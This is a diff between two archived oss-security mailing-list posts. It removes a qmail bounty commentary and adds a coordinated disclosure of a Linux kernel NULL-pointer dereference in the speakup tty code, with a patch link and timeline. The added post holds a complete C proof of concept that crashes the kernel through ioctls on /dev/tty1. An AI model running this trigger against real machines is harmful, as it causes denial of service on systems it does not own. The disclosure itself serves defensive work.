@@ -1,49 +1,78 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/05/21/1
-Message-ID: <CAGUWgD8s3DtM6sG9Pj478H06G_evwPsF49pK5Cig0VUHY_mrQg@mail.gmail.com>
-Date: Thu, 21 May 2020 12:56:23 +0300
-From: Georgi Guninski <gguninski@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/12/07/1
+Message-ID: <CAM1BPE5H=DB0=83v4+i4pqUCJeJre5UTv5XSSV1MoX-4Ufyb0A@mail.gmail.com>
+Date: Mon, 7 Dec 2020 10:20:44 +0800
+From: Shisong Qin <qinshisong1205@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Short notes on qmail security guarantee
+Cc: nopitydays@...il.com
+Subject: Linux kernel NULL-ptr deref bug in spk_ttyio_receive_buf2
 Content-Type: text/plain; charset=utf-8
 
- From my blog:
-https://j.ludost.net/blog/archives/2020/05/21/short_notes_on_qmail_security_guarantee/index.html
+Hi,
 
-Short notes on qmail security guarantee
+Recently we found another NULL-ptr deref BUG in spk_ttyio.c in the latest
+Linux kernel(5.9.11 is the latest at that now). In the
+spk_ttyio_receive_buf2() function, it would dereference spk_ttyio_synth
+without checking whether it is NULL or not, and may lead to a NULL-ptr
+deref crash.
 
-Disclaimer: written in hurry, could be wrong.
+This bug could be reproduced in the Linux kernel (e.g. 5.9.11) with
+CONFIG_ACCESSIBILITY=y, CONFIG_SPEAKUP=y and CONFIG_KASAN=y, and here is a
+simple poc:
 
-djb offers monetary bounty for verifiable qmail exploit,
-called "qmail security guarantee" [1].
+#define _GNU_SOURCE
 
-He hasn't awarded the bounty yet, despite several
-vulnerabilities found by us in 2005 [2] and in 2020 [3]
-Qualys discovered that at least one of the vulnerabilities
-works in default qmail install.
+#include <dirent.h>
+#include <endian.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdarg.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <time.h>
+#include <unistd.h>
 
-Both of these vulnerabilities require more that 4GB memory.
+#pragma pack(1)
+typedef struct {
+        char subcode;
+        short xs, ys, xe, ye;
+        short sel_mode;
+} sel_struct;
 
-djb's main argument is that nobody gives a lot of memory
-to qmail-smtpd (and as djb might missed to all other
-qmail- components).
+int main(int argc, char const *argv[]) {
 
-We believe that the claim of memory limit is wrong for
-the following reasons:
+    int disc = 0x1a;
+    int fd = open("/dev/tty1", 0, 0);
+    ioctl(fd, 0x5423, &disc);
 
-1. qmail's install documentation doesn't mention memory limits
-2. Qualys claims that their exploit works on the default
-install of all packages they have seen (and all package maintainers
-have missed memory limits).
-3. djb shouldn't assume that 4-8GB will be enough for the
-normal functioning of qmail. In theory libc might require
-more RAM in the future. Currently mobile phones have
-32+GB RAM and there is clear trend in grow of RAM.
-4. By common sense, distributing software with known vulnerabilities
-is bad practice.
-5. AFAIK djb teaches students about coding and security and he
-better lead by example of good coding.
+    sel_struct sel;
+    sel.subcode = 2;
+    sel.xs = sel.ys = sel.xe = sel.ye = 0;
+    sel.sel_mode = 0x0; // sel_mode = 0x0/0x1/0x2 could trigger this
+NULL-ptr dereference bug
+    ioctl(fd, 0x541c, &sel);
+    char data = 3;
+    ioctl(fd, 0x541c, &data);
+    return 0;
+}
 
-[1] https://cr.yp.to/qmail/guarantee.html
-[2] http://www.guninski.com/where_do_you_want_billg_to_go_today_4.html
-[3] https://www.openwall.com/lists/oss-security/2020/05/19/8
+Here is the commit to patch this BUG:
+https://git.kernel.org/pub/scm/linux/kernel/git/gregkh/char-misc.git/commit/?h=char-misc-linus&id=f0992098cadb4c9c6a00703b66cafe604e178fea
+
+Timeline:
+* 2020/11/24 - Vulnerability reported to security@...nel.org
+* 2020/11/29 - Vulnerability confirmed, and reported to
+linux-distros@...openwall.org.
+* 2020/12/7 - Vulnerability opened.
+
+Thanks, Shisong Qin and Bodong Zhao, Tsinghua University
+
